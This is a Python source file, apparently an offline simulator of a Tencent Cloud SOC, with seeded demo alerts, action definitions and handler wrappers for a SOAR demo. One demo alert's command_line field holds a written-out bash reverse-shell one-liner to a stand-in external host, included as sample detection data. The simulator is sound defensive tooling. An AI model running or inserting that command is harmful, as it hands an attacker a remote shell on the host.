...
APP_NAME = 'tencent_soc_sim'
PRODUCT_NAME = '腾讯云 SOC（模拟）'
APP_DESCRIPTION = '离线模拟腾讯云 SOC 的告警汇聚、事件分级、链路健康和处置回写能力'
APP_VERSION = '1.0.0'
DEFAULT_RECORDS = json.loads('[{"id": "soc-alert-20260724-0001", "kind": "soc_alert", "name": "支付站点 SQL 注入攻击", "ip": "203.0.113.77", "owner": "alice", "status": "new", "severity": "critical", "summary": "WAF 检测到高置信 SQL 注入，建议联动天幕与 WAF 封禁来源 IP", "data": {"alert_id": "soc-alert-20260724-0001", "asset_id": "asset-cvm-prod-web-01", "host_id": "ins-prod-web-01", "business_id": "biz-checkout", "business_name": "统一收银台", "owner": "alice", "src_ip": "203.0.113.77", "dst_ip": "10.10.8.23", "host_ip": "10.10.8.23", "external_ip": "203.0.113.77", "direction": "inbound", "confidence": 96, "trace_id": "demo-trace-web-0001", "occurred_at": "2026-07-24T09:31:22+08:00", "alert_type": "web_sql_injection", "ingestion_channel": "kafka", "suggested_products": ["tencent_tianmu_sim", "tencent_waf_sim"], "white_list_hit": false}}, {"id": "soc-alert-20260724-0002", "kind": "soc_alert", "name": "主机反弹 Shell 与矿池外联", "ip": "10.10.8.23", "owner": "alice", "status": "new", "severity": "critical", "summary": "主机安全检测到异常 bash 进程连接外部 C2，建议 CFW/天幕双向阻断", "data": {"alert_id": "soc-alert-20260724-0002", "asset_id": "asset-cvm-prod-web-01", "host_id": "ins-prod-web-01", "business_id": "biz-checkout", "business_name": "统一收银台", "owner": "alice", "src_ip": "10.10.8.23", "dst_ip": "198.51.100.66", "host_ip": "10.10.8.23", "external_ip": "198.51.100.66", "direction": "outbound", "confidence": 99, "trace_id": "demo-trace-reverse-shell-0002", "occurred_at": "2026-07-24T10:06:48+08:00", "alert_type": "reverse_shell", "process_name": "bash", "command_line": "bash -i >& /dev/tcp/198.51.100.66/4444 0>&1", "ingestion_channel": "syslog", "suggested_products": ["tencent_cfw_sim", "tencent_tianmu_sim"], "white_list_hit": false}}, {"id": "soc-alert-20260724-0003", "kind": "soc_alert", "name": "VPC 内横向访问核心数据库", "ip": "10.10.8.23", "owner": "alice", "status": "investigating", "severity": "high", "summary": "Web 主机异常访问核心数据库管理端口，建议使用 CFW 限制东西向流量", "data": {"alert_id": "soc-alert-20260724-0003", "asset_id": "asset-cvm-prod-web-01", "host_id": "ins-prod-web-01", "business_id": "biz-checkout", "business_name": "统一收银台", "owner": "alice", "src_ip": "10.10.8.23", "dst_ip": "10.10.9.15", "host_ip": "10.10.8.23", "external_ip": "", "direction": "east_west", "confidence": 91, "trace_id": "demo-trace-lateral-0003", "occurred_at": "2026-07-24T10:12:03+08:00", "alert_type": "lateral_movement", "protocol": "TCP", "port": 3306, "ingestion_channel": "kafka", "suggested_products": ["tencent_cfw_sim"], "white_list_hit": false}}]')
ACTION_DEFINITIONS = json.loads('[{"action": "health_check", "description": "检查模拟 API、鉴权和组件状态", "operation": "health", "classify": "query", "parameters": {}, "sample": {}, "record_kinds": [], "filter_map": {}, "target_params": []}, {"action": "query_ingestion_health", "description": "查询 Syslog/Kafka 告警外发链路和最近告警时间", "operation": "health", "classify": "query", "parameters": {}, "sample": {}, "record_kinds": [], "filter_map": {}, "target_params": []}, {"action": "fetch_high_risk_alerts", "description": "拉取待处置的高危告警", "operation": "query", "classify": "query", "parameters": {"severity": {"data_type": "string", "description": "告警等级", "required": false, "order": 0, "default_value": "critical"}, "status": {"data_type": "string", "description": "告警状态", "required": false, "order": 1, "default_value": "new"}, "limit": {"data_type": "integer", "description": "返回数量", "required": false, "order": 2, "default_value": 20}}, "sample": {"severity": "critical", "status": "new", "limit": 20}, "record_kinds": ["soc_alert"], "filter_map": {"severity": ["severity"], "status": ["status"]}, "target_params": []}, {"action": "query_alert_detail", "description": "根据告警 ID 查询完整处置上下文", "operation": "query", "classify": "query", "parameters": {"alert_id": {"data_type": "string", "description": "SOC 告警 ID", "required": true, "order": 0}}, "sample": {"alert_id": "soc-alert-20260724-0001"}, "record_kinds": ["soc_alert"], "filter_map": {"alert_id": ["id", "alert_id"]}, "target_params": []}, {"action": "emit_demo_alert", "description": "生成一条手动演示告警", "operation": "create_record", "classify": "write", "parameters": {"alert_id": {"data_type": "string", "description": "告警 ID；不填则自动生成", "required": false, "order": 0}, "alert_name": {"data_type": "string", "description": "告警名称", "required": false, "order": 1, "default_value": "手动演示高危告警"}, "alert_type": {"data_type": "string", "description": "告警类型", "required": false, "order": 2, "default_value": "web_attack"}, "src_ip": {"data_type": "string", "description": "攻击源 IP", "required": false, "order": 3, "default_value": "203.0.113.77"}, "dst_ip": {"data_type": "string", "description": "受害资产 IP", "required": false, "order": 4, "default_value": "10.10.8.23"}, "asset_id": {"data_type": "string", "description": "受害资产 ID", "required": false, "order": 5, "default_value": "asset-cvm-prod-web-01"}, "owner": {"data_type": "string", "description": "资产负责人", "required": false, "order": 6, "default_value": "alice"}, "severity": {"data_type": "string", "description": "告警等级", "required": false, "order": 7, "default_value": "high"}, "confidence": {"data_type": "integer", "description": "置信度 0-100", "required": false, "order": 8, "default_value": 90}, "trace_id": {"data_type": "string", "description": "SOAR 链路追踪 ID", "required": false, "order": 20, "default_value": "demo-trace-web-0001"}, "operator": {"data_type": "string", "description": "操作者账号", "required": false, "order": 21, "default_value": "soar-demo"}, "trigger_source": {"data_type": "string", "description": "触发来源，例如 soc_alert、manual、scheduled", "required": false, "order": 22, "default_value": "soc_alert"}, "approval_id": {"data_type": "string", "description": "审批单 ID；需要审批时由剧本传入", "required": false, "order": 23}}, "sample": {"alert_name": "手动演示 Web 攻击告警", "src_ip": "203.0.113.77", "dst_ip": "10.10.8.23", "asset_id": "asset-cvm-prod-web-01", "owner": "alice", "severity": "high", "confidence": 95, "trace_id": "demo-trace-manual-0004"}, "record_kinds": [], "filter_map": {}, "target_params": [], "result_status": "new", "id_param": "alert_id", "create_kind": "soc_alert"}, {"action": "update_alert_status", "description": "更新 SOC 告警状态", "operation": "update_record", "classify": "write", "parameters": {"alert_id": {"data_type": "string", "description": "SOC 告警 ID", "required": true, "order": 0}, "status": {"data_type": "string", "description": "目标状态", "required": false, "order": 1, "default_value": "investigating"}, "comment": {"data_type": "string", "description": "状态说明", "required": false, "order": 2, "default_value": "SOAR 已开始处置"}, "trace_id": {"data_type": "string", "description": "SOAR 链路追踪 ID", "required": false, "order": 10, "default_value": "demo-trace-web-0001"}, "operator": {"data_type": "string", "description": "操作者账号", "required": false, "order": 11, "default_value": "soar-demo"}, "trigger_source": {"data_type": "string", "description": "触发来源，例如 soc_alert、manual、scheduled", "required": false, "order": 12, "default_value": "soc_alert"}, "approval_id": {"data_type": "string", "description": "审批单 ID；需要审批时由剧本传入", "required": false, "order": 13}}, "sample": {"alert_id": "soc-alert-20260724-0001", "status": "investigating", "comment": "SOAR 已完成上下文增强", "trace_id": "demo-trace-web-0001"}, "record_kinds": ["soc_alert"], "filter_map": {"alert_id": ["id", "alert_id"]}, "target_params": ["alert_id"]}, {"action": "writeback_disposition", "description": "回写跨产品处置结果和策略 ID", "operation": "update_record", "classify": "write", "parameters": {"alert_id": {"data_type": "string", "description": "SOC 告警 ID", "required": true, "order": 0}, "status": {"data_type": "string", "description": "处置状态", "required": false, "order": 1, "default_value": "closed"}, "disposition": {"data_type": "string", "description": "处置结论", "required": false, "order": 2, "default_value": "confirmed_malicious"}, "policy_ids": {"data_type": "string", "description": "关联策略 ID，多个值用逗号分隔", "required": false, "order": 3}, "comment": {"data_type": "string", "description": "处置说明", "required": false, "order": 4, "default_value": "已完成网络侧阻断"}, "trace_id": {"data_type": "string", "description": "SOAR 链路追踪 ID", "required": false, "order": 10, "default_value": "demo-trace-web-0001"}, "operator": {"data_type": "string", "description": "操作者账号", "required": false, "order": 11, "default_value": "soar-demo"}, "trigger_source": {"data_type": "string", "description": "触发来源，例如 soc_alert、manual、scheduled", "required": false, "order": 12, "default_value": "soc_alert"}, "approval_id": {"data_type": "string", "description": "审批单 ID；需要审批时由剧本传入", "required": false, "order": 13}}, "sample": {"alert_id": "soc-alert-20260724-0001", "status": "closed", "disposition": "confirmed_malicious", "policy_ids": "tm-pol-demo-0001,waf-pol-demo-0001", "trace_id": "demo-trace-web-0001"}, "record_kinds": ["soc_alert"], "filter_map": {"alert_id": ["id", "alert_id"]}, "target_params": ["alert_id"], "result_status": "closed"}, {"action": "query_operation_history", "description": "查询产品模拟操作审计记录", "operation": "history", "classify": "query", "parameters": {"trace_id": {"data_type": "string", "description": "按 trace_id 过滤", "required": false, "order": 0}, "target": {"data_type": "string", "description": "按目标 IP、资产或策略 ID 过滤", "required": false, "order": 1}, "limit": {"data_type": "integer", "description": "返回数量", "required": false, "order": 2, "default_value": 50}}, "sample": {"trace_id": "demo-trace-web-0001", "limit": 20}, "record_kinds": [], "filter_map": {}, "target_params": []}]')
HEALTH_COMPONENTS = json.loads('["Syslog 接收链路", "Kafka 消费链路", "告警归一化引擎", "事件回写接口"]')
...
def query_ingestion_health(params, assets, context_info):
    """查询 Syslog/Kafka 告警外发链路和最近告警时间"""
    return _execute('query_ingestion_health', params, assets, context_info)


def fetch_high_risk_alerts(params, assets, context_info):
    """拉取待处置的高危告警"""
    return _execute('fetch_high_risk_alerts', params, assets, context_info)
...
def emit_demo_alert(params, assets, context_info):
    """生成一条手动演示告警"""
    return _execute('emit_demo_alert', params, assets, context_info)
...
def writeback_disposition(params, assets, context_info):
    """回写跨产品处置结果和策略 ID"""
    return _execute('writeback_disposition', params, assets, context_info)
